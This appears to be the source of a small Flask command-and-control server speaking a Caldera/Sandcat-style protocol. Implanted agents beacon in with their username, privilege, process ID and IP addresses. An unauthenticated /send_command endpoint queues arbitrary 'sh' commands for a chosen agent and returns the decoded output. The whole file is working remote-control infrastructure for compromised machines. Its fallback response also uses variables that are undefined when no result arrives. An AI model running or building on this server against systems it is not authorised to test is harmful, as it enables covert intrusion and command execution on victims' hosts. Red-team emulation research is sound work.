from flask import Flask, request, jsonify
import json
import base64
from Instruction import Instruction
import uuid
import asyncio

app = Flask(__name__)

# Store agents
agents = {}

commandEvents = {}


def decode_base64(data):
    return base64.b64decode(data).decode("utf-8")


def encode_base64(data):
    return str(base64.b64encode(json.dumps(data).encode()), "utf-8")


# Agent check-in
@app.route("/beacon", methods=["POST"])
def beacon():
    data = request.data
    decoded_data = decode_base64(data)
    json_data = json.loads(decoded_data)

    paw = json_data.get("paw")
    results = json_data.get("results", [])

    if not paw:
        return jsonify({"error": "Missing agent ID"}), 400

    agent = agents.get(paw)

    if not agent:
        agent = {"paw": paw, "info": data, "instructions": []}
        agents[paw] = agent

    for result in results:
        commandId = result.get("id")
        if commandId in commandEvents:
            commandEvents[commandId].set()

    agent["results"] = results

    commands = agent["instructions"]

    instruction_str = json.dumps([json.dumps(i.display) for i in commands])

    response = {
        "paw": paw,
        "sleep": 10,
        "watchdog": int(60),
        "instructions": instruction_str,
    }

    encoded_response = encode_base64(response)

    print("[+] Agent check-in:", paw)

    return encoded_response


# Get agents
@app.route("/agents", methods=["GET"])
def get_agents():
    agents_list = {}
    for paw, data in agents.items():
        try:
            decoded_info = decode_base64(data["info"])
            parsed_info = json.loads(decoded_info)

            agents_list[paw] = {
                "paw": paw,
                "username": parsed_info.get("username"),
                "privilege": parsed_info.get("privilege"),
                "pid": parsed_info.get("pid"),
                "host_ip_addrs": parsed_info.get("host_ip_addrs"),
            }
        except (base64.binascii.Error, UnicodeDecodeError) as exc:
            raise ValueError(f"Invalid base64 data: {exc!r}")
        except json.JSONDecodeError as exc:
            raise ValueError(f"Malformed JSON: {exc!r}")

    return jsonify(agents_list)


# Send command to a specific agent
@app.route("/send_command", methods=["POST"])
async def send_command():
    data = request.data
    json_data = json.loads(data)
    agent = json_data.get("agent")
    command = json_data.get("command")

    if agent not in agents:
        return jsonify({"error": "Agent not found"})

    commandId = str(uuid.uuid4())

    instruction = Instruction(
        id=commandId,
        command=encode_base64(command),
        executor="sh",
        timeout=60,
        payloads=[],
        uploads=[],
    )

    agents[agent]["instructions"].append(instruction)

    commandEvents[commandId] = asyncio.Event()

    try:
        await asyncio.wait_for(commandEvents[commandId].wait(), timeout=30)
    except asyncio.TimeoutError:
        return jsonify({"message": "Timeout waiting for response"})

    results = agents[agent]["results"]

    for result in results:
        if result["id"] == commandId:
            id = result.get("id")
            agent_time = result.get("agent_reported_time")
            exit_code = result.get("exit_code")
            pid = result.get("pid")
            status = result.get("status")
            output = result.get("output")
            stderr = result.get("stderr")
            decoded_output = decode_base64(output)
            decoded_stderr = decode_base64(stderr)

            agents[agent]["results"].remove(result)
            agents[agent]["instructions"].remove(instruction)
            del commandEvents[commandId]
            return jsonify(
                {
                    "results": {
                        "message": "Command executed",
                        "id": id,
                        "agent_reported_time": agent_time,
                        "exit_code": exit_code,
                        "pid": pid,
                        "status": status,
                        "output": decoded_output,
                        "stderr": decoded_stderr,
                    }
                }
            )

    return jsonify(
        {
            "results": {
                "message": "Command sent, no response received",
                "id": id,
                "agent_reported_time": agent_time,
                "exit_code": exit_code,
                "pid": pid,
                "status": status,
                "output": decoded_output,
                "stderr": decoded_stderr,
            }
        }
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8888)
